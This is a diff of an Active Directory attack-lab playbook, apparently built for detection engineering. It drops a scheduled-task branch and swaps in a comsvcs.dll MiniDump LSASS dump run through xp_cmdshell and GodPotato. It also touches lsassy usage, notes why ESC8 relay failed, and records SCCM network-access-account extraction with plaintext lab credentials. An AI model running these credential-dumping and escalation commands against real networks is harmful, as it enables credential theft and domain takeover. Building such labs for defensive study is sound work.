@@ -1748,7 +1748,7 @@ We have SYSTEM on mbr01. analyst_cloud has an active console session (auto-logon
 
 **Lab design:** LSASS PPL, VBS disabled via `04-vulnerabilities.yml`. In real Server 2025, LSASS dump would be blocked — 3.5A (Winlogon registry) or 3.5D (file delivery) would be primary paths.
 
-**Execution order:** 3.5F → 3.5A → 3.5G → 3.5H → 3.5B → 3.5C → 3.5D → 3.5E → 3.5I → 3.5J → 3.5K → 3.5L → 3.5M
+**Execution order:** 3.5F → 3.5A → 3.5G → 3.5H → 3.5C → 3.5D → 3.5E → 3.5I → 3.5J → 3.5K → 3.5L → 3.5M. (**3.5B removed — scheduled tasks are persistence-only, never execution wrappers. Rule 2.**)
 
 
 | Branch | Technique                        | Prerequisites                | Outcome                               |
@@ -1757,8 +1757,6 @@ We have SYSTEM on mbr01. analyst_cloud has an active console session (auto-logon
 | 3.5A   | Winlogon registry (plaintext)    | Auto-logon ON ✅              | analyst_cloud password                |
 | 3.5G   | Offensive DPAPI (Nemesis)        | Saved creds in profile       | DPAPI-decrypted credentials           |
 | 3.5H   | ctfmon.exe password extraction   | Typed passwords in CLI tools | SSH/WinSCP/MySQL passwords            |
-| 3.5B   | Scheduled task as analyst_cloud  | Password known               | SharpHound as analyst_cloud           |
-| 3.5B†  | Invisible scheduled tasks        | Task created                 | Task hidden from all tools            |
 | 3.5C   | RDP interactive session          | Password known               | Full SharpHound data                  |
 | 3.5D   | File detonation (H-01..H-06 / WT063-068) — post-exploit telemetry | User click                   | Telemetry demo                        |
 | 3.5E   | Logon trigger (Startup folder)   | User profile exists          | Auto-execution                        |
@@ -1907,9 +1905,10 @@ Copy-Item -Path 'C:\Tools\ADTools\procdump.exe' -Destination '\\mbr01.child.cadr
 # Dump LSASS (attempt 1: direct)
 EXEC xp_cmdshell 'C:\Windows\Temp\cadre-tools\GodPotato-NET4.exe -cmd "cmd /c C:\Windows\Temp\cadre-tools\procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\cadre-tools\ls.dmp"';
 
-# If direct fails (token issue), use schtasks as SYSTEM
-EXEC xp_cmdshell 'C:\Windows\Temp\cadre-tools\GodPotato.exe -cmd "cmd /c schtasks /create /tn CADRE-Procdump /ru SYSTEM /tr \"C:\Windows\Temp\cadre-tools\procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\cadre-tools\ls.dmp\" /sc once /st 00:00 /f"';
-EXEC xp_cmdshell 'C:\Windows\Temp\cadre-tools\GodPotato.exe -cmd "cmd /c schtasks /run /tn CADRE-Procdump"';
+# If direct fails (token issue), use comsvcs.dll MiniDump as SYSTEM (no scheduled task — Rule 2)
+EXEC xp_cmdshell 'C:\Windows\Temp\cadre-tools\GodPotato.exe -cmd "cmd /c wmic process where name=\"lsass.exe\" get processid"';
+# → LSASS PID, then:
+EXEC xp_cmdshell 'C:\Windows\Temp\cadre-tools\GodPotato.exe -cmd "cmd /c C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid> C:\Windows\Temp\cadre-tools\ls.dmp full"';
 ```
 
 **Parse offline:**
@@ -1928,7 +1927,7 @@ pypykatz lsa minidump ls.dmp
 
 **Tool:** [lsassy v3.1.16](https://github.com/login-securite/lsassy) (Mar 23 2026) — 15+ LSASS dump methods in one tool. Also available as NetExec module.
 
-**Why this alternative:** lsassy automates dump method selection. Auto-picks the best method per target (comsvcs, procdump, nanodump, dumpert, ppldump, silentprocessexit, etc.). More reliable than manual procdump + schtasks.
+**Why this alternative:** lsassy automates dump method selection. Auto-picks the best method per target (comsvcs, procdump, nanodump, dumpert, ppldump, silentprocessexit, etc.). More reliable than manual procdump direct.
 
 ```bash
 # From Kali against mbr01 (with admin creds from Phase 3 SQL chain)
@@ -1947,7 +1946,7 @@ lsassy -m nanodump -d child.cadre.local -u analyst_t1 -p 'T13r_An@lyst!' 192.168
 - Should work in our lab since LSASS PPL is OFF (per `04-vulnerabilities.yml`)
 - Best run from Kali to mbr01 (avoids AV/EDR issues on the target)
 
-**When to use this over 3.5F:** Use lsassy when you want cleaner logon + better evasion. Use manual procdump + schtasks (3.5F) when you need to capture a specific process access pattern for testing detection rules.
+**When to use this over 3.5F:** Use lsassy when you want cleaner logon + better evasion. Use manual procdump / comsvcs direct (3.5F) when you need to capture a specific process access pattern for testing detection rules. (No scheduled-task fallback — Rule 2.)
 
 **Telemetry:** Same as 3.5F — Sysmon EID 10 (LSASS access), EID 1 (dump method binary), WinSec 4663. Telemetry fingerprint identical for detection engineering purposes.
 
@@ -2090,7 +2089,7 @@ EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c C:\Users\Public\pro
 
 #### 3.5B — Scheduled Task as analyst_cloud (Post-Credential) ❌ REJECTED FOR ATTACK CHAIN
 
-> **Attacker realism note:** Attackers do not create scheduled tasks to **run** attack tools. Scheduled tasks are a persistence technique, not an execution wrapper. The credential-theft phase should produce credentials; the next phase uses those credentials directly (WinRS, PsExec, runas, RDP, etc.) rather than hiding tool execution inside a task.
+> **Attacker realism note (Rule 2 — locked 2026-07-31):** Attackers do not create scheduled tasks to **run** attack tools. Scheduled tasks are a persistence technique, not an execution wrapper. The credential-theft phase should produce credentials; the next phase uses those credentials directly (WinRS, PsExec, runas, RDP, etc.) rather than hiding tool execution inside a task. Scheduled tasks are valid **only as persistence mechanisms** (e.g. the invisible-task variant below, Phase 5).
 
 **Prerequisite:** Password known from 3.5A or 3.5F.
 
@@ -3261,6 +3260,8 @@ AD CS is deployed on dc01 with **12 in-scope ESC misconfigurations**. Each explo
 | ESC6  | *(CA-level)*              | `EDITF_ATTRIBUTESUBJECTALTNAME2` flag enabled                                                      | CA admin             |
 | ESC7  | *(CA-level)*              | `lead_engineering` has ManageCA + Issue rights                                                     | Any user             |
 | ESC8  | *(Web Enrollment)*        | CertSrv app pool as NetworkService (NTLM relay)                                                    | Cred coercion        |
+
+> **ESC8 (WT052) — DEFERRED 2026-08-01 (root cause documented):** Prior attempts treated ws01's kernel-held port 445 as the blocker. Live testing (tcpdump on relay host + relay logs) proved the REAL blocker: **no SMB-authenticated coercion works on Server 2025 in this lab.** (1) The v5 "custom SMB port `--smb-port 8445` + Coercer `@8445` UNC" premise is FALSE — the Windows SMB client does not honor `@port` in UNC (zero TCP connections to non-445 ports captured). (2) MS-RPRN (WT017, the only working coerce) makes the victim dial the attacker's **RPC endpoint 135 anonymously** ("Empty username ... just waiting" in impacket `rpcrelayserver.py`) — never an authenticated SMB session. (3) MS-EFSR blocked, MS-DFSNM/MS-FSRVP/MS-EVEN no dial-out. ADCS web-enrollment surface remains configured (401 = NTLM challenge). **Revisit at end** (candidates: Kerberos-relay/krbrelayx, or restoring an SMB-coerce primitive).
 | ESC9  | `CADRE-ESC9`              | `NO_SECURITY_EXTENSION` flag (`0x80000`)                                                           | Write on user object |
 | ESC10 | *(Registry)*              | `StrongCertificateBindingEnforcement=0` + `CertificateMappingMethods=31`                           | Write on user        |
 | ESC11 | *(ICPR)*                  | `0x43E0000` flags — ICPR enabled, integrity removed                                                | Network access to CA |
@@ -3308,7 +3309,9 @@ certipy auth -pfx user.pfx -dc-ip 192.168.77.10 -domain cadre.local
 
 ### Branch C: SCCM Escalation (range.local)
 
-> **Verification note (2026-07-29):** SCCM site `CAD` is confirmed deployed and active on `mbr02` (verified via `08-sql-sccm-wsus-verify.yml`). WT034 NAA extraction was verified live by reading `\\mbr02.range.local\vault\naa-rotation-notice.txt` as `range\svc_sccm` / `s3rv1c3_SCCM!`; the extracted NAA is `range\svc_naa` / `N@A_s3rv1c3!`, which is a Domain Admin on `dc03`. WT035-039 (PXE, Client Push, CMPivot, App Deploy, Site Takeover) were not exercised in this run — they require bare-metal/client infrastructure that was not tested.
+> **Verification note (2026-08-01 — deep):** SCCM site `CAD` confirmed active on `mbr02` (build 9141). WT034 NAA extraction verified (vault bait file → `range\svc_naa` / `N@A_s3rv1c3!` = DA on dc03) AND confirmed in the provider (`SMS_SCI_ClientComp` Software Distribution `Network Access User Names = RANGE\svc_naa`). Deep surface validation 2026-08-01 as `range\svc_sccm` via **SMS Provider WMI with explicit creds** from ws01 (`root\SMS\site_CAD`): local `SMS Admins` membership (svc_sccm ✅, plus **cross-forest `CADRE\chief_command` + `analyst_purple`**), PXE **approved cert** (`SMS_PXECertificateInfo` SMSID `{256B7D4F-…}`, PXE server MBR02) + 2 boot images (x64 `CAD00002`/arm64 `CAD00005`), client-push component enabled, `SMS_Scripts.CreateScripts` works, `SMS_Package`+`SMS_Program` (SYSTEM) created. **Root-caused constraints:** (1) **The AdminService is NOT deployed on mbr02** (no IIS app pool, no `/AdminService` web app, no `bin\AdminService`) → CMPivot (WT037) / script-run (WT039) have no target; the `HTTP/mbr02.range.local` SPN on `svc_sccm` + CD (`msDS-AllowedToDelegateTo`, intentional in `05-ad-attack-surface.yml`) is correct, and the intended path is post-Kerberoast **S4U2Self→S4U2Proxy to HTTP/mbr02 → AdminService (pool MUST run as `RANGE\svc_sccm` to decrypt tickets)**. Deployment fix documented in `sccm-integration-guide.md` **Phase 6A** + verify checks in `10-sccm-verify.yml`. (2) `SMS_Advertisement.Put` = Generic failure via raw WMI (needs console) → WT038/039 exec via console/AdminService. (3) **`cifs/mbr02.range.local` SPN missing** → SMB Kerberos to mbr02 broken (NTLM-only; verify-playbook candidate). Full PXE boot-image exploit (WT035) needs a real PXE client. Test objects cleaned up; provisioning restored.
+>
+> **SharpSCCM v2.0.13 notes (verified 2026-08-01):** v2 syntax uses `-mp`/`-sms` (not the v1 `-s`); `get naa`/`get secrets` = same command and requires a **computer account** (or PXE cert+media GUID) via the MP — NOT a user logon; `get admins`/`exec` use the **current session token** (no `-u/-p`) — run via Rubeus `createnetonly`/`asktgt /ptt` (requires `cifs` SPN for SMB; absent here) or replicate with PowerShell WMI + explicit creds (proven).
 
 **Diverges from:** Phase 8 (cross-forest access gives `svc_sccm`).
 **Converges to:** Phase 8 (NAA extraction gives range.local DA).
